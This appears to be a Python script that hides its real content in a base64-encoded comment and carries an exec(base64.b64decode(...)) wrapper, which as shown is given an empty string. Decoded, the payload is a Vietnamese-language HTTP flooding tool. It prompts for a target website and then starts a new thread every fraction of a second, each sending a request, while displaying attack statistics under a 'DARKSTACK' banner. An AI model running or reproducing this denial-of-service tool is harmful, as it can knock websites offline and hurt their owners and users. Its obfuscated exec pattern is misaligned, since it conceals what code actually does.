# TranHaoEncrypt:DARKSTACK
# MODE:BASE64
# DATA:aW1wb3J0IHRpbWUKaW1wb3J0IHRocmVhZGluZwppbXBvcnQgc2lnbmFsCmltcG9ydCByZXF1ZXN0cwpmcm9tIHJpY2guY29uc29sZSBpbXBvcnQgQ29uc29sZQpmcm9tIHJpY2gucGFuZWwgaW1wb3J0IFBhbmVsCmZyb20gcmljaC50YWJsZSBpbXBvcnQgVGFibGUKZnJvbSByaWNoLmxheW91dCBpbXBvcnQgTGF5b3V0CmZyb20gcmljaC5wcm9ncmVzcyBpbXBvcnQgUHJvZ3Jlc3MsIFNwaW5uZXJDb2x1bW4sIFRleHRDb2x1bW4sIEJhckNvbHVtbiwgVGltZVJlbWFpbmluZ0NvbHVtbgoKIyBjb25zb2xlCmNvbnNvbGUgPSBDb25zb2xlKCkKCmNsYXNzIFN0YXRzOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYudG90YWxfcmVxdWVzdHMgPSAwCiAgICAgICAgc2VsZi5zdWNjZXNzZnVsX3JlcXVlc3RzID0gMAogICAgICAgIHNlbGYudGltZW91dHMgPSAwCiAgICAgICAgc2VsZi5mYWlsZWRfY29ubmVjdGlvbnMgPSAwCiAgICAgICAgc2VsZi5vdGhlcl9lcnJvcnMgPSAwCiAgICAgICAgc2VsZi50b3RhbF90aW1lID0gMAogICAgICAgIHNlbGYuc3RhcnRfdGltZSA9IHRpbWUudGltZSgpCiAgICAgICAgc2VsZi5hY3RpdmUgPSBUcnVlCgpkZWYgZm9ybWF0X251bWJlcihudW0pOgogICAgcmV0dXJuIGYie251bTosfSIKCmRlZiBzZW5kX3JlcXVlc3QodXJsLCB0aHJlYWRfaWQsIHN0YXRzLCBwcm9ncmVzcyk6CiAgICBpZiBub3Qgc3RhdHMuYWN0aXZlOgogICAgICAgIHJldHVybgogICAgdHJ5OgogICAgICAgIHN0YXJ0X3RpbWUgPSB0aW1lLnRpbWUoKQogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KHVybCwgdGltZW91dD0xKQogICAgICAgIGVuZF90aW1lID0gdGltZS50aW1lKCkKICAgICAgICByZXNwb25zZV90aW1lID0gZW5kX3RpbWUgLSBzdGFydF90aW1lCgogICAgICAgIHN0YXRzLnRvdGFsX3JlcXVlc3RzICs9IDEKICAgICAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgIHN0YXRzLnN1Y2Nlc3NmdWxfcmVxdWVzdHMgKz0gMQogICAgICAgIHN0YXRzLnRvdGFsX3RpbWUgKz0gcmVzcG9uc2VfdGltZQoKICAgICAgICBzdGF0dXNfcGFuZWwgPSBQYW5lbCgKICAgICAgICAgICAgZiLwn4yQIFtib2xkIHdoaXRlXVBo4bqjbiBo4buTaTpbL10gW2N5YW5de3Jlc3BvbnNlLnN0YXR1c19jb2RlfVsvXVxuIgogICAgICAgICAgICBmIuKPsSBbYm9sZCB3aGl0ZV1UaOG7nWkgZ2lhbjpbL10gW2JsdWVde3Jlc3BvbnNlX3RpbWU6LjNmfXNbL10iLAogICAgICAgICAgICB0aXRsZT1mIltib2xkIGdyZWVuXVRocmVhZCAje3RocmVhZF9pZDowM2R9Wy9dIiwKICAgICAgICAgICAgYm9yZGVyX3N0eWxlPSJicmlnaHRfd2hpdGUiLAogICAgICAgICAgICBwYWRkaW5nPSgwLCAxKQogICAgICAgICkKICAgICAgICBwcm9ncmVzcy5jb25zb2xlLnByaW50KHN0YXR1c19wYW5lbCkKCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5UaW1lb3V0OgogICAgICAgIHN0YXRzLnRpbWVvdXRzICs9IDEKICAgICAgICBlcnJvcl9wYW5lbCA9IFBhbmVsKAogICAgICAgICAgICAi4oybIFtib2xkIHJlZF1USOG7nEkgR0lBTiBI4bq+VCBI4bqgTlsvXSIsCiAgICAgICAgICAgIHRpdGxlPWYiW2JvbGQgcmVkXVRocmVhZCAje3RocmVhZF9pZDowM2R9Wy9dIiwKICAgICAgICAgICAgYm9yZGVyX3N0eWxlPSJyZWQiLAogICAgICAgICAgICBwYWRkaW5nPSgwLCAxKQogICAgICAgICkKICAgICAgICBwcm9ncmVzcy5jb25zb2xlLnByaW50KGVycm9yX3BhbmVsKQogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgogICAgICAgIHN0YXRzLmZhaWxlZF9jb25uZWN0aW9ucyArPSAxCiAgICAgICAgZXJyb3JfcGFuZWwgPSBQYW5lbCgKICAgICAgICAgICAgIuKdjCBbYm9sZCByZWRdS+G6vlQgTuG7kEkgVEjhuqRUIELhuqBJWy9dIiwKICAgICAgICAgICAgdGl0bGU9ZiJbYm9sZCByZWRdVGhyZWFkICN7dGhyZWFkX2lkOjAzZH1bL10iLAogICAgICAgICAgICBib3JkZXJfc3R5bGU9InJlZCIsCiAgICAgICAgICAgIHBhZGRpbmc9KDAsIDEpCiAgICAgICAgKQogICAgICAgIHByb2dyZXNzLmNvbnNvbGUucHJpbnQoZXJyb3JfcGFuZWwpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgc3RhdHMub3RoZXJfZXJyb3JzICs9IDEKICAgICAgICBlcnJvcl9wYW5lbCA9IFBhbmVsKAogICAgICAgICAgICBmIuKaoO+4jyBbYm9sZCByZWRdTOG7lkk6IHtzdHIoZSl9Wy9dIiwKICAgICAgICAgICAgdGl0bGU9ZiJbYm9sZCByZWRdVGhyZWFkICN7dGhyZWFkX2lkOjAzZH1bL10iLAogICAgICAgICAgICBib3JkZXJfc3R5bGU9InJlZCIsCiAgICAgICAgICAgIHBhZGRpbmc9KDAsIDEpCiAgICAgICAgKQogICAgICAgIHByb2dyZXNzLmNvbnNvbGUucHJpbnQoZXJyb3JfcGFuZWwpCgpkZWYgY3JlYXRlX3Jlc3VsdHNfZGlzcGxheShzdGF0cyk6CiAgICBtYWluX3N0YXRzID0gVGFibGUuZ3JpZChwYWRkaW5nPTEpCiAgICBtYWluX3N0YXRzLmFkZF9jb2x1bW4oIvCfk4ogVGjhu5FuZyBrw6oiLCBzdHlsZT0iYm9sZCBjeWFuIikKICAgIG1haW5fc3RhdHMuYWRkX2NvbHVtbigiR2nDoSB0cuG7iyIsIHN0eWxlPSJib2xkIHdoaXRlIikKCiAgICBtYWluX3N0YXRzLmFkZF9yb3coIvCflIQgVOG7lW5nIHnDqnUgY+G6p3UiLCBmb3JtYXRfbnVtYmVyKHN0YXRzLnRvdGFsX3JlcXVlc3RzKSkKICAgIG1haW5fc3RhdHMuYWRkX3Jvdygi4pyFIFRow6BuaCBjw7RuZyIsIGYiW2JvbGQgZ3JlZW5de2Zvcm1hdF9udW1iZXIoc3RhdHMuc3VjY2Vzc2Z1bF9yZXF1ZXN0cyl9Wy9dIikKICAgIG1haW5fc3RhdHMuYWRkX3Jvdygi4p2MIFRo4bqldCBi4bqhaSIsIGYiW2JvbGQgcmVkXXtmb3JtYXRfbnVtYmVyKHN0YXRzLmZhaWxlZF9jb25uZWN0aW9ucyl9Wy9dIikKICAgIG1haW5fc3RhdHMuYWRkX3Jvdygi4oybIEjhur90IHRo4budaSBnaWFuIiwgZiJbYm9sZCB5ZWxsb3dde2Zvcm1hdF9udW1iZXIoc3RhdHMudGltZW91dHMpfVsvXSIpCiAgICBtYWluX3N0YXRzLmFkZF9yb3coIuKaoO+4jyBM4buXaSBraMOhYyIsIGYiW2JvbGQgcmVkXXtmb3JtYXRfbnVtYmVyKHN0YXRzLm90aGVyX2Vycm9ycyl9Wy9dIikKCiAgICBlbGFwc2VkID0gdGltZS50aW1lKCkgLSBzdGF0cy5zdGFydF90aW1lCiAgICBycHMgPSBzdGF0cy50b3RhbF9yZXF1ZXN0cyAvIGVsYXBzZWQgaWYgZWxhcHNlZCA+IDAgZWxzZSAwCiAgICBzdWNjZXNzX3JhdGUgPSAoc3RhdHMuc3VjY2Vzc2Z1bF9yZXF1ZXN0cyAvIHN0YXRzLnRvdGFsX3JlcXVlc3RzICogMTAwKSBpZiBzdGF0cy50b3RhbF9yZXF1ZXN0cyA+IDAgZWxzZSAwCiAgICBhdmdfcmVzcG9uc2UgPSAoc3RhdHMudG90YWxfdGltZSAvIHN0YXRzLnRvdGFsX3JlcXVlc3RzKSBpZiBzdGF0cy50b3RhbF9yZXF1ZXN0cyA+IDAgZWxzZSAwCgogICAgcGVyZl9zdGF0cyA9IFRhYmxlLmdyaWQocGFkZGluZz0xKQogICAgcGVyZl9zdGF0cy5hZGRfY29sdW1uKCLimqEgSGnhu4d1IHN14bqldCIsIHN0eWxlPSJib2xkIG1hZ2VudGEiKQogICAgcGVyZl9zdGF0cy5hZGRfY29sdW1uKCJHacOhIHRy4buLIiwgc3R5bGU9ImJvbGQgd2hpdGUiKQoKICAgIHBlcmZfc3RhdHMuYWRkX3Jvdygi8J+agCBZw6p1IGPhuqd1L2dpw6J5IiwgZiJbYm9sZCBjeWFuXXtycHM6LjJmfVsvXSIpCiAgICBwZXJmX3N0YXRzLmFkZF9yb3coIvCfk4ggVOG7tyBs4buHIHRow6BuaCBjw7RuZyIsIGYiW2JvbGQgZ3JlZW5de3N1Y2Nlc3NfcmF0ZTouMWZ9JVsvXSIpCiAgICBwZXJmX3N0YXRzLmFkZF9yb3coIuKPsSBQaOG6o24gaOG7k2kgVEIiLCBmIltib2xkIGJsdWVde2F2Z19yZXNwb25zZTouM2Z9c1svXSIpCiAgICBwZXJmX3N0YXRzLmFkZF9yb3coIvCflZIgVOG7lW5nIHRo4budaSBnaWFuIiwgZiJbYm9sZCBtYWdlbnRhXXtlbGFwc2VkOi4xZn1zWy9dIikKCiAgICBsYXlvdXQgPSBMYXlvdXQoKQogICAgbGF5b3V0LnNwbGl0X3JvdygKICAgICAgICBQYW5lbChtYWluX3N0YXRzLCB0aXRsZT0iW2JvbGQgZ3JlZW5d8J+TiiBUaOG7kW5nIGvDqlsvXSIsIGJvcmRlcl9zdHlsZT0iYnJpZ2h0X3doaXRlIiksCiAgICAgICAgUGFuZWwocGVyZl9zdGF0cywgdGl0bGU9Iltib2xkIHllbGxvd13imqEgSGnhu4d1IHN14bqldFsvXSIsIGJvcmRlcl9zdHlsZT0iYnJpZ2h0X3doaXRlIikKICAgICkKICAgIHJldHVybiBsYXlvdXQKCmRlZiBzaWduYWxfaGFuZGxlcihzaWdudW0sIGZyYW1lKToKICAgIHJhaXNlIEtleWJvYXJkSW50ZXJydXB0CgpkZWYgY2xlYXJfc2NyZWVuKCk6CiAgICBjb25zb2xlLmNsZWFyKCkKCmRlZiBwcmludF9iYW5uZXIoKToKICAgIGJhbm5lciA9ICIiIltib2xkIGN5YW5dCiAg4paE4paI4paI4paI4paI4paEICAg4paE4paE4paEICAgICAgIOKWiOKWiOKWgOKWiOKWiOKWiCAgIOKWiOKWiCDiloTilojiloDiloTiloTiloTiloQgICAgICDiloTiloTiloQgICDiloTilojilojilojilojiloQgICDilojilogg4paE4paI4paACiDilpLilojilojiloAg4paA4paIICDilpLilojilojilojilojiloQgICAg4paT4paI4paIIOKWkiDilojilojilpIg4paI4paI4paE4paI4paS4paS4paI4paI4paI4paI4paEICAg4paE4paI4paI4paI4paI4paEIOKWkuKWiOKWiOKWgCDiloDiloggICDilojilojiloTilojilpIgCiDilpLilpPiloggICAg4paEIOKWkuKWiOKWiCAg4paA4paI4paEICDilpPilojilogg4paR4paE4paIIOKWkuKWk+KWiOKWiOKWiOKWhCDilpLilojiloggIOKWgOKWiOKWhOKWkuKWiOKWiOKWgCDiloDilogg4paS4paT4paIICAgIOKWhCDilpPilojilojilojiloTilpEgCiDilpLilpPilpPiloQg4paE4paI4paI4paS4paR4paI4paI4paE4paE4paE4paE4paI4paIIOKWkuKWiOKWiOKWgOKWgOKWiOKWhCAg4paT4paI4paIIOKWiOKWhOKWkeKWiOKWiOKWhOKWhOKWhOKWhOKWiOKWkeKWiOKWiOKWhOKWhOKWhOKWhOKWiOKWkuKWk+KWk+KWhCDiloTilojilojilpLilpPilojilogg4paI4paEIAog4paSIOKWk+KWiOKWiOKWiOKWgCDilpEg4paT4paIICAg4paT4paI4paI4paS4paR4paI4paI4paTIOKWkuKWiOKWiOKWkuKWkuKWiOKWiOKWkiDilojiloTilpPiloggICDilpPilojilojilpLilpPiloggICDilpPilojilojilpIg4paT4paI4paI4paI4paAIOKWkeKWkuKWiOKWiOKWkiDilojiloQKIOKWkSDilpHilpIg4paSICDilpEg4paS4paSICAg4paT4paS4paI4paR4paRIOKWkuKWkyDilpHilpLilpPilpHilpIg4paS4paSIOKWk+KWkuKWkuKWkiAgIOKWk+KWkuKWiOKWkeKWkuKWkiAgIOKWk+KWkuKWiOKWkSDilpHilpIg4paSICDilpHilpIg4paS4paSIOKWk+KWkgogICDilpEgIOKWkiAgICAg4paSICAg4paS4paSIOKWkSAg4paR4paSIOKWkSDilpLilpHilpEg4paR4paSIOKWkuKWkSDilpIgICDilpLilpIg4paRIOKWkiAgIOKWkuKWkiDilpEg4paRICDilpIgICDilpEg4paR4paSIOKWkuKWkQog4paRICAgICAgICAgIOKWkSAgIOKWkiAgICAg4paR4paRICAg4paRIOKWkSDilpHilpEg4paRICDilpEgICDilpIgICAg4paRICAg4paSICDilpEgICAgICAgIOKWkSDilpHilpEg4paRIAog4paRIOKWkSAgICAgICAgICAgIOKWkSAg4paRICAg4paRICAgICDilpEgIOKWkSAgICAgICAg4paRICDilpEgICAgIOKWkSAg4paRIOKWkSAgICAgIOKWkSAg4paRICAgClsvXQoKW2JvbGQgbWFnZW50YV3ilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIFbL10KICAgICAgICAgICBbd2hpdGVdVFLhuqZOIEjDgE8gREVWWy9dIHwgW2N5YW5dREFSS1NUQUNLWy9dCltib2xkIG1hZ2VudGFd4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBWy9dCiIiIgogICAgY29uc29sZS5wcmludChQYW5lbChiYW5uZXIsIGJvcmRlcl9zdHlsZT0iYnJpZ2h0X3doaXRlIiwgcGFkZGluZz0oMSwgMikpKQoKZGVmIG1haW4oKToKICAgIGNsZWFyX3NjcmVlbigpCiAgICBwcmludF9iYW5uZXIoKQoKICAgIHVybCA9IGNvbnNvbGUuaW5wdXQoIlxuW2JvbGQgeWVsbG93XfCflJcgTmjhuq1wIExpbmsgV2ViOlsvXSAiKQogICAgZGVsYXkgPSBjb25zb2xlLmlucHV0KCJbYm9sZCByZWRd4o+zIE5o4bqtcCDEkeG7mSB0cuG7hSAoMCAtPiAxKTpbL10gIikKCiAgICB0cnk6CiAgICAgICAgZGVsYXkgPSBmbG9hdChkZWxheSkKICAgICAgICBpZiBub3QgKDAuMSA8PSBkZWxheSA8PSAxKToKICAgICAgICAgICAgZGVsYXkgPSAwLjEKICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIGRlbGF5ID0gMC4xCgogICAgY2xlYXJfc2NyZWVuKCkKICAgIHByaW50X2Jhbm5lcigpCgogICAgYXR0YWNrX2NvbmZpZyA9IGYiIiJbYm9sZCB3aGl0ZV3wn5SXIExpbms6Wy9dIHt1cmx9Cltib2xkIHdoaXRlXeKPsyDEkOG7mSB0cuG7hTpbL10ge2RlbGF5fXMiIiIKCiAgICBjb25zb2xlLnByaW50KFBhbmVsKGF0dGFja19jb25maWcsIHRpdGxlPSJbYm9sZCByZWRd8J+agCBSVU5bL10iLCBib3JkZXJfc3R5bGU9ImJyaWdodF93aGl0ZSIpKQoKICAgIHN0YXRzID0gU3RhdHMoKQogICAgc2lnbmFsLnNpZ25hbChzaWduYWwuU0lHSU5ULCBzaWduYWxfaGFuZGxlcikKCiAgICB3aXRoIFByb2dyZXNzKAogICAgICAgIFNwaW5uZXJDb2x1bW4oKSwKICAgICAgICBUZXh0Q29sdW1uKCJbYm9sZCBjeWFuXcSQYW5nIHRo4buxYyBoaeG7h24uLi5bL10iKSwKICAgICAgICBCYXJDb2x1bW4ocHVsc2Vfc3R5bGU9InJlZCIpLAogICAgICAgIFRpbWVSZW1haW5pbmdDb2x1bW4oKSwKICAgICAgICBjb25zb2xlPWNvbnNvbGUKICAgICkgYXMgcHJvZ3Jlc3M6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB0aHJlYWRfaWQgPSAxCiAgICAgICAgICAgIHdoaWxlIHN0YXRzLmFjdGl2ZToKICAgICAgICAgICAgICAgIHRocmVhZCA9IHRocmVhZGluZy5UaHJlYWQoCiAgICAgICAgICAgICAgICAgICAgdGFyZ2V0PXNlbmRfcmVxdWVzdCwKICAgICAgICAgICAgICAgICAgICBhcmdzPSh1cmwsIHRocmVhZF9pZCwgc3RhdHMsIHByb2dyZXNzKQogICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgdGhyZWFkLmRhZW1vbiA9IFRydWUKICAgICAgICAgICAgICAgIHRocmVhZC5zdGFydCgpCiAgICAgICAgICAgICAgICB0aHJlYWRfaWQgKz0gMQogICAgICAgICAgICAgICAgdGltZS5zbGVlcChkZWxheSkKICAgICAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICAgICAgICAgIHN0YXRzLmFjdGl2ZSA9IEZhbHNlCiAgICAgICAgICAgIGNvbnNvbGUucHJpbnQoIlxuW2JvbGQgcmVkXeKaoCDEkMOjIGThu6tuZyFbL10iKQogICAgICAgIGZpbmFsbHk6CiAgICAgICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICAgICAgY29uc29sZS5wcmludCgiXG4iKQogICAgICAgICAgICBjb25zb2xlLnByaW50KGNyZWF0ZV9yZXN1bHRzX2Rpc3BsYXkoc3RhdHMpKQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIG1haW4oKQo=

import base64
exec(base64.b64decode("").decode("utf-8"))
